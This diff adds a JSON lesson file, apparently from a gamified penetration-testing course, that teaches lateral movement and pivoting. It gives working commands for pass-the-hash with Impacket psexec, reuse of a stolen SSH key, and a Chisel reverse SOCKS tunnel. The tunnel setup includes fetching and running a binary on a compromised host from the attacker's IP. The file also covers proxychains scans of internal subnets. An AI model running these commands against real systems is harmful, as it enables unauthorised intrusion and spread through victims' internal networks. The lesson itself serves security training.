@@ -1,0 +1,85 @@
+{
+    "id": "l5",
+    "chapterId": "ch_11",
+    "title": "Lateral Movement & Pivoting 🌉",
+    "description": "Use the compromised machine as a jump box to attack other internal targets.",
+    "xpReward": 45,
+    "estimatedMinutes": 14,
+    "section": "Lateral Movement",
+    "slides": [
+        {
+            "id": "s_l5_1",
+            "type": "text",
+            "title": "What is Pivoting? 🔄",
+            "content": "# Using Host A to Attack Host B\n\nYou have a shell on `WebServer (10.0.0.5)`. It has a second network interface connected to `10.0.1.0/24`, a network your Kali machine **cannot** reach directly.\n\n**Pivoting** is the technique of routing traffic **through** the compromised host to access otherwise inaccessible networks.\n\n**Analogy**: The WebServer is your **foothold** in a secret club. Pivoting is using your membership card to bring your friends (your scanning tools) inside with you.\n\n**Key Concepts:**\n- **Proxychains**: Forces tools like `nmap` and `crackmapexec` to route through a SOCKS proxy.\n- **Port Forwarding**: Forward a specific port from the target's internal network to your local machine.\n- **SSH Tunneling**: Leverage SSH to create encrypted tunnels."
+        },
+        {
+            "id": "s_l5_2",
+            "type": "text",
+            "title": "Lateral Movement Techniques 🚶",
+            "content": "# Hopping Between Hosts\n\nOnce you have credentials (or a hash) from one machine, use them to access others.\n\n**1. Pass-the-Hash (PtH)**\nWindows stores password hashes (NTLM) in memory. You don't need the cleartext password to authenticate to SMB or WinRM. You just need the **hash**.\n- Tool: **Impacket's `psexec`** or **`wmiexec`**.\n```bash\npsexec.py DOMAIN/Administrator@10.0.0.10 -hashes :aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99\n```\n\n**2. SSH Key Reuse**\nIf you find an SSH private key (`id_rsa`) on the first Linux host, try it against other Linux servers on the network.\n```bash\nssh -i stolen_key root@10.0.0.20\n```\n\n**3. RDP Hijacking**\nIf you have SYSTEM privileges, you can connect to an existing logged-in user's RDP session without their password.\n\n**4. PSExec / WinRM**\nIf you have local admin credentials (or hash), use `psexec` or PowerShell Remoting to execute commands remotely."
+        },
+        {
+            "id": "s_l5_3",
+            "type": "quiz",
+            "title": "Lateral Movement 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l5_1",
+                "type": "multiple_choice",
+                "question": "What is required to perform a Pass-the-Hash (PtH) attack?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "The user's cleartext password.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "The user's NTLM hash and a valid username.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Physical access to the machine.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "A keylogger installed.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "PtH uses the NTLM hash directly for authentication to SMB/WinRM, bypassing the need for the cleartext password.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l5_4",
+            "type": "text",
+            "title": "Pivoting with Chisel and Proxychains ⛓️",
+            "content": "# The Swiss Army Knife of Tunneling\n\n**Chisel** is a fast TCP/UDP tunnel over HTTP, secured by SSH. It's excellent for pivoting.\n\n**Setup (Reverse SOCKS Proxy):**\n1.  **On Kali (Server)**: `./chisel server -p 8000 --reverse`\n2.  **On Compromised Host (Client)**: Upload `chisel` and run:\n    `./chisel client 192.168.56.102:8000 R:socks`\n\nThis creates a SOCKS proxy on Kali port `1080` that routes traffic **through** the compromised host.\n\n**Using Proxychains:**\nEdit `/etc/proxychains4.conf` and ensure it contains `socks5 127.0.0.1 1080`.\nNow, any command prefixed with `proxychains` will use the tunnel:\n```bash\nproxychains nmap -sT -Pn 10.0.1.50\nproxychains crackmapexec smb 10.0.1.0/24\n```"
+        },
+        {
+            "id": "s_l5_5",
+            "type": "code",
+            "title": "Chisel Pivot Setup 💻",
+            "content": "Step-by-step to pivot into an internal network.",
+            "codeSnippet": "# On Kali (Attacker) - Terminal 1\nchisel server -p 8000 --reverse\n\n# Transfer chisel to compromised host\nwget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz\ngunzip chisel_1.9.1_linux_amd64.gz\npython3 -m http.server 80\n\n# On Compromised Host (e.g., WebServer 10.0.0.5)\ncd /tmp\nwget http://192.168.56.102/chisel_1.9.1_linux_amd64 -O chisel\nchmod +x chisel\n./chisel client 192.168.56.102:8000 R:socks\n\n# On Kali - Terminal 2\nproxychains nmap -sT -Pn 10.0.1.0/24",
+            "codeLanguage": "bash",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l5_6",
+            "type": "text",
+            "title": "SSH Tunneling (Local & Remote) 🔐",
+            "content": "# The Classic Pivot\n\nIf you have SSH access to a pivot host, you can create tunnels without extra tools.\n\n**1. Local Port Forwarding (-L)**\nAccess a remote service **through** the SSH host.\n```bash\nssh -L 8888:10.0.1.50:80 user@pivot_host\n# Now http://localhost:8888 accesses the internal web server on port 80.\n```\n\n**2. Remote Port Forwarding (-R)**\nExpose a service from your Kali machine **to** the internal network (useful for reverse shells).\n```bash\nssh -R 4444:localhost:4444 user@pivot_host\n# Connections to pivot_host:4444 are forwarded to Kali:4444.\n```\n\n**3. Dynamic Port Forwarding (-D)**\nCreates a SOCKS proxy (like Chisel, but via SSH).\n```bash\nssh -D 1080 user@pivot_host\n# Configure proxychains to use socks5 127.0.0.1 1080.\n```"
+        },
+        {
+            "id": "s_l5_7",
+            "type": "tip",
+            "title": "Pro Tip: Double Pivoting 🚀",
+            "content": "## Pivoting Through Multiple Hosts\n\nIf Host A can reach Host B, and Host B can reach Host C, you can chain pivots.\n1.  Pivot from Kali to Host A (Chisel).\n2.  On Host A, upload Chisel again and forward traffic to Host B.\n3.  Use `proxychains` with multiple entries in the config file.\n\nThis is how advanced persistent threats (APTs) hide their tracks."
+        }
+    ]
+}
